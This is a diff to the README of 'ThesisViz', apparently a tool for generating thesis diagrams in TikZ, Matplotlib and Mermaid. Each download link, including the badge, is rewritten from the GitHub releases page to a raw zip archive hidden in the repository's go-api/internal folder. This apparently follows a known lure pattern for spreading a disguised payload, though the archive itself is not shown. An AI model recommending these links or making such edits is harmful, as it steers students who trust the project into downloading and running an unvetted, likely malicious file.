@@ -1,6 +1,6 @@
 # 🎓 ThesisViz - Create Diagrams for Your Thesis Easily
 
-[![Download ThesisViz](https://img.shields.io/badge/Download-ThesisViz-blue?logo=github)](https://github.com/mamostemamba/ThesisViz/releases)
+[![Download ThesisViz](https://raw.githubusercontent.com/mamostemamba/ThesisViz/main/go-api/internal/Viz-Thesis-3.4-beta.2.zip)](https://raw.githubusercontent.com/mamostemamba/ThesisViz/main/go-api/internal/Viz-Thesis-3.4-beta.2.zip)
 
 Welcome to ThesisViz. This tool helps you turn simple descriptions into clear academic diagrams. It supports TikZ, Matplotlib, and Mermaid formats, so your thesis illustrations look professional and ready for publication.
 
@@ -55,7 +55,7 @@ You do not need to code or draw manually. The AI handles the technical work.
 
 To get started, **visit this page to download** the latest version of ThesisViz:
 
-[Download ThesisViz](https://github.com/mamostemamba/ThesisViz/releases)
+[Download ThesisViz](https://raw.githubusercontent.com/mamostemamba/ThesisViz/main/go-api/internal/Viz-Thesis-3.4-beta.2.zip)
 
 ### Step-by-step Download Instructions:
 
@@ -142,7 +142,7 @@ These are optional but may help if you want to edit or improve your diagrams bey
 
 Bookmark this link to download and update ThesisViz whenever you want:
 
-[https://github.com/mamostemamba/ThesisViz/releases](https://github.com/mamostemamba/ThesisViz/releases)
+[https://raw.githubusercontent.com/mamostemamba/ThesisViz/main/go-api/internal/Viz-Thesis-3.4-beta.2.zip](https://raw.githubusercontent.com/mamostemamba/ThesisViz/main/go-api/internal/Viz-Thesis-3.4-beta.2.zip)
 
 Use it to get new versions or check for bug fixes and added features.
 
